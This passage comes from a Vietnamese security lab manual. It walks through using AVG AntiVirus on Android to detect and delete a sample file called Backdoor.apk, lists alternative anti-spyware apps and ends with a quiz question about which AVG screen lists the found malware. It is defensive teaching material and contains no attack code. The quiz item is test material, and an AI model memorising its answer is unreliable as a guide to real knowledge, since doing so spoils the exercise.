> ![Screenshot](media/image39.jpeg){width="12.0in" height="9.0in"}

8.  Màn hình Mối đe dọa xuất hiện. Điều này sẽ hiển thị cho bạn tất cả phần mềm độc hại (nếu có) được tìm thấy trên thiết bị của bạn.

> Số lượng phần mềm độc hại được tìm thấy có thể khác nhau khi bạn thực hiện thí nghiệm.

9.  Nhấp vào nút  GIẢI QUYẾT  để xóa phần mềm độc hại được phát hiện khỏi thiết bị của bạn.

> ![Screenshot](media/image40.jpeg){width="12.0in" height="9.0in"}

10. Cửa sổ Sự cố cần khắc phục xuất hiện hiển thị danh sách phần mềm độc hại được phát hiện. Quá trình quét đã phát hiện phần mềm độc hại trong tệp \"/storage/emulated/0/Download/Backdoor.apk\", để giải quyết vấn đề này, hãy nhấp vào XÓA.

> ![2.1.10.jpg](media/image41.jpeg){width="12.0in" height="9.0in"}

11. Tương tự, hãy nhấp vào XÓA trong phần Đã phát hiện phần mềm độc hại để xóa phần mềm độc hại tương ứng.

> Nếu cửa sổ bật lên MainActivity xuất hiện, hãy nhấp vào OK để gỡ cài đặt ứng dụng.
>
> ![Screenshot](media/image42.jpeg){width="6.199133858267716in" height="4.649350393700788in"}

12. Sau khi loại bỏ phần mềm độc hại, bạn có thể gặp phải các cảnh báo còn lại. Chỉ cần nhấp vào dấu chấm lửng và chọn Bỏ qua để loại bỏ chúng.

13. Sau khi hoàn tất quá trình, cửa sổ Quét xong xuất hiện, nhấp vào \"X\" hiện ở góc trên bên trái của cửa sổ để đóng cửa sổ.

14. Phần này kết thúc phần minh họa cách bảo mật thiết bị Android khỏi các ứng dụng độc hại bằng AVG.

15. Bạn có thể sử dụng các công cụ chống vi-rút và phần mềm gián điệp dành cho thiết bị di động khác như Certo: Anti Spyware & Security (https://play.google.com), Anti Spy Detector - Spyware (https://play.google.com), iAmNotified - Anti Spy System (https://iamnotified.com), Anti Spy (https://www.protectstar.com) và Secury - Anti Spy Security (https://apps.apple.com) để bảo vệ thiết bị di động khỏi các ứng dụng độc hại.

16. Đóng tất cả các cửa sổ đang mở và ghi lại tất cả thông tin thu được.

**Câu 17.2.1.1**

Trong máy Android, sử dụng công cụ AVG AntiVirus để quét Thiết bị Android để tìm phần mềm độc hại và giải quyết các tệp phần mềm độc hại được phát hiện. Màn hình nào trong công cụ diệt virus AVG hiển thị danh sách phần mềm độc hại và file độc ​​hại được tìm thấy sau khi quét?
